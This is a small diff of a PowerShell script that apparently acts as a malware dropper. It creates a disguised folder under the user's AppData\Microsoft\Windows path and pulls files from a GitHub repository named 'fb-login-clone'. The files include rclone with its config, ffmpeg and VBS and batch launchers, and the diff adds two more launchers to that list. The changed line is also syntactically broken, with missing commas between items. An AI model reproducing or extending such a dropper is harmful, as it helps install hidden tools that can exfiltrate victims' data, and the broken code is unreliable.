@@ -2,7 +2,7 @@
 
 $dest = "$env:APPDATA\Microsoft\Windows\luna"
 $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
-$files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.vbs")
+$files = @("luna.ps1", "luna_launcher.bat" "rclone.exe", "rclone.conf", "ffmpeg.exe", "setup.vbs" "luna_launcher.vbs")
 
 # 
 New-Item -ItemType Directory -Path $dest -Force | Out-Null
